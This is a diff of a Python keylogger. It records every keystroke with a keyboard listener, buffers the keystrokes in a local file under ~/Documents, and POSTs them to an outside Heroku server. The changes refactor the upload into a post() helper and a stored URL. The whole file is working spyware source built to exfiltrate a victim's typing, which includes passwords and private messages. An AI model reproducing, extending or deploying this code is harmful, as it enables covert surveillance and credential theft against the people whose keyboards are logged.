@@ -16,30 +16,18 @@ import requests, os
 class KeyLogger:
     def __init__(self, buffer_size):
         self.data = []
+        self.url = "https://quiet-garden-51523.herokuapp.com/log/"
         self.buffer_size = buffer_size
         with Listener(on_press=self.on_pressed, on_release=self.on_release) as l:
             l.join()
 
     def write(self):
         log_data = "".join(self.data)
-        url = "https://quiet-garden-51523.herokuapp.com/log/"
-        #write the data to local file
         
-        # async def mai():
-        #     async with aiohttp.ClientSession() as session:
-        #         pokemon_url = 'https://quiet-garden-51523.herokuapp.com/log/'
-        #         async with session.get(pokemon_url) as resp:
-        #             pokemon = await resp.json()
-        #             print(pokemon)
-        # asyncio.run(mai())
-
-
 
         mode = 'w'
         if os.path.isfile(os.path.expanduser('~/Documents/logabdi.txt')):
             mode = 'a'
-
-        
 
 
 
@@ -50,31 +38,35 @@ class KeyLogger:
             lines = []
             with open(os.path.expanduser('~/Documents/logabdi.txt'), 'r') as f:
                 lines = f.readlines()
-            # print(lines)
-            # for line in lines:
-            res = requests.post(url, {
-                "user": 'user',
-                'data' :" ".join(lines)})
-            # print(res)
-            if res.status_code != 200:
-                
-                with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
-                    f.write(log_data)
-                return 
+            print(lines)
+            if len(lines ) > 0 and lines[0] != ' ':
+                res = self.post(lines)            
+                if res.status_code != 200:
+                    self.write_to_files(mode, log_data)
+                    return 
             print('here')
-            res = requests.post(url, {
-                    "user": 'user',
-                    'data' : log_data})
+            res = self.post([log_data])
             print(res)
-            
-            with open(os.path.expanduser('~/Documents/logabdi.txt'), "w") as f:
-                f.write(" ")
+            self.write_to_files('w',' ')
             
         except:
             print('in except block')
             with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
                 f.write(log_data)
         print('after mass')
+
+
+
+
+    def write_to_files(self, mode, line):
+        with open(os.path.expanduser('~/Documents/logabdi.txt'), mode) as f:
+            f.write(line)
+    
+    def post(self, lines):
+        res = requests.post(self.url, {
+                "user": 'user',
+                'data' :" ".join(lines)})
+        return res
 
 
         #send data to the internet
